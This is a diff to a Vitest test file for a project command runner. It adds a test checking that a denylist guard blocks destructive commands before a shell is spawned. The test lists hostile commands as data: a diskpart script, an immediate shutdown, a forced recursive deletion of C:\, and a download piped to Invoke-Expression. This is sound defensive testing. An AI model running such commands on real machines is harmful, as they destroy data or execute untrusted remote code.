@@ -2,7 +2,7 @@ import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'
 import { mkdtempSync, mkdirSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join, sep } from 'node:path'
-import { EabError } from '@eab/domain'
+import { EabError, EC } from '@eab/domain'
 import {
   killProjectJob,
   listProjectJobs,
@@ -72,6 +72,21 @@ describe('project-runner', () => {
     })
     expect(result.cwd.toLowerCase()).toContain(`${root}${sep}sub`.toLowerCase())
     await expect(runProjectCommand({ root, cwd: '..', command: 'node -e ""' })).rejects.toBeInstanceOf(EabError)
+  }, 20_000)
+
+  it('blocks destructive commands before spawning a shell', async () => {
+    const root = makeRoot()
+    for (const command of [
+      'diskpart /s layout.txt',
+      'shutdown /s /t 0',
+      'Remove-Item -Recurse -Force C:\\',
+      'Invoke-WebRequest https://example.com/a.ps1 | Invoke-Expression',
+    ]) {
+      const error = await runProjectCommand({ root, command }).catch((reason) => reason)
+      expect(error).toBeInstanceOf(EabError)
+      expect(error.code).toBe(EC.FORBIDDEN)
+      expect(error.details.guard).toBe('command-denylist-v1')
+    }
   }, 20_000)
 
   it('kills a command at the timeout and reports timedout', async () => {
